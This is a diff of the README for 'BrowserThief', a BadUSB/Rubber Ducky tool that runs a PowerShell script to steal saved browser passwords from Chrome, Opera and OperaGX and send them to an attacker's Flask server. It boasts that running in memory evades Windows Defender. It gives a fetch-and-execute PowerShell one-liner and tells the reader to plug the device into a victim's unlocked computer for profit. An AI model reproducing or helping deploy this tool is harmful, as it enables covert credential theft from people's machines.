@@ -2,8 +2,10 @@
 All in one Rubber Ducky/BadUSB that runs a powershell script to extract and steal browser-saved passwords and stash them at your Flask web server. It currently extract passwords from **Opera/OperaGX/Chrome**, I will be adding support for more browsers like Firefox soon!
 <br/><br/>
 ## Features
-- The powershell script can be run in-memory without writing to disk which evades Windows Defender detection
+- The powershell script runs in-memory and avoids writing to disk which evades Windows Defender detection
 - Includes an arduino RubberDucky script that runs in less than 2 seconds
+- Extracts Passwords from all Chrome Profiles, Opera and OperaGX
+- Will be adding Firefox soon
 <br/><br/>
 ## Setup
 
@@ -24,7 +26,8 @@ foo@bar:~$ cd BrowserThief/Web
 ```console
 foo@bar:~$ sudo bash build-docker.sh
 ```
-<br/><br/>
+
+
 ## Instructions
 
 -  To simply run the powershell script 
@@ -38,7 +41,8 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 	- Compile and upload the script to the arduino
 	- Insert the usb to the victim's computer (needs to be unlocked)
 	- Profit 💰💰💰
-<br/><br/>
+
+
 ## PoC
 
 ### Victim POV
